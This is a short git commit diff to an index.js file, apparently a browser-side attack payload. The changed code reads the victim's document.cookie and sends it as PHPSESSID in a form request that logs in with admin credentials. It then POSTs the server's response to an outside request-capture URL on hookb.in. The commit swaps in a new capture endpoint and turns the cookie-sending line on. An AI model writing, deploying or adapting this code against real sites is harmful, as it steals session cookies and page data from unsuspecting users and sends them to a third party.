c3bf5daa0e03385f02fa12657aba6a2ece393381
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-05 11:16:24 -0800

    Update index.js

--- index.js
+++ index.js
@@ -5,14 +5,13 @@ http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 http.onload = function () {
     //if (http.readyState === http.DONE) {
         const xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://hookb.in/QJ9Nge003MT8mNzzl1b9', true);
+        xhr.open('POST', 'https://hookb.in/6JnwV7XZERCoRnwwYrGm', true);
         xhr.setRequestHeader('Content-type', 'application/json');
         xhr.send(JSON.stringify(http.responseText));
         
      //}
 };
 const cook = document.cookie;
-//"PHPSESSID="+cook+
-http.send("&username=admin&pin=admin&notRobot=on");
+http.send("PHPSESSID="+cook+"&username=admin&pin=admin&notRobot=on");
    
 
